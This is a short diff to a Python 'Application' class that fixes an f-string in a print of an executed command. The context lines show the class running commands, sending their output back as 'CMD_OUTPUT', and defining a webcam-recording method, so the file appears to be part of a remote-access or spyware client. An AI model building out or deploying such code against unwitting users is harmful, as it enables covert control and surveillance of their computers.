@@ -129,7 +129,7 @@ class Application(object):
             print(f"Got Following output: {output}")
 
             self.send_information(f"CMD_OUTPUT {tempid} {output}")
-            print("Executed cmd Command: {realcommand}")
+            print(f"Executed cmd Command: {realcommand}")
 
 
     def record_webcam_image(self):
